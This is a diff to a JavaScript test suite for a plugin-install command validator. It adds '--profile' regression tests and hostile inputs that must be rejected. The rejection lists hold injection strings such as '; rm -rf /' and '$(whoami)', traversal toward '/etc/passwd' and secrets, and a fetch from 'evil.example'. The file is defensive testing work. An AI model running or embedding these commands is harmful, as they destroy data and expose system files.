@@ -13,6 +13,31 @@ test("accepts a bare npm specifier", () => {
   assert.equal(plan.target, "dsh-memory");
 });
 
+// Regression, and the one that mattered: the catalogue emits `--profile` on
+// every command because without it nothing installs. The guard matched only
+// the flagless form, so the plugin refused every real listing as unsafe.
+// This is the exact string `/api/v1/plugins` returns.
+test("accepts the command the catalogue actually sends", () => {
+  const plan = planFromCommand(
+    "dsh plugin --profile web add @liustack/modlens",
+    "liustack/modlens",
+  );
+  assert.equal(plan.target, "@liustack/modlens");
+});
+
+// The profile in the command is informational. The one this plugin is running
+// in wins, so a listing cannot redirect an install into another profile.
+test("the command's profile does not survive into the args", () => {
+  const plan = planFromCommand("dsh plugin --profile web add dsh-memory", "a/b");
+  assert.deepEqual(installArgs(plan, "tui"), [
+    "plugin",
+    "--profile",
+    "tui",
+    "add",
+    "dsh-memory",
+  ]);
+});
+
 // `dsh plugin` forwards to pnpm inside a profile directory, so the profile is
 // mandatory. Getting this wrong makes every install fail with
 // "required option '--profile <name>' not specified".
@@ -52,6 +77,13 @@ for (const hostile of [
   "dsh plugin remove foo",
   "dsh plugin add ../../etc/passwd",
   "dsh plugin add https://evil.example/x.tgz",
+  // Widening the pattern to allow `--profile` must not widen anything else.
+  "dsh plugin --profile web add foo; rm -rf /",
+  "dsh plugin --profile web add $(whoami)",
+  "dsh plugin --profile ../../etc add foo",
+  "dsh plugin --profile web; rm -rf / add foo",
+  "dsh plugin --profile web add foo bar",
+  "dsh plugin --profile add foo",
 ]) {
   test(`rejects: ${JSON.stringify(hostile)}`, () => {
     assert.throws(
@@ -83,6 +115,8 @@ for (const traversal of [
   "dsh plugin add ./local-thing",
   "dsh plugin add github:owner/repo#../../secrets",
   "dsh plugin add @scope/../escape",
+  "dsh plugin --profile web add ../../etc/passwd",
+  "dsh plugin --profile web add github:owner/repo#../../secrets",
 ]) {
   test(`rejects traversal: ${JSON.stringify(traversal)}`, () => {
     assert.throws(
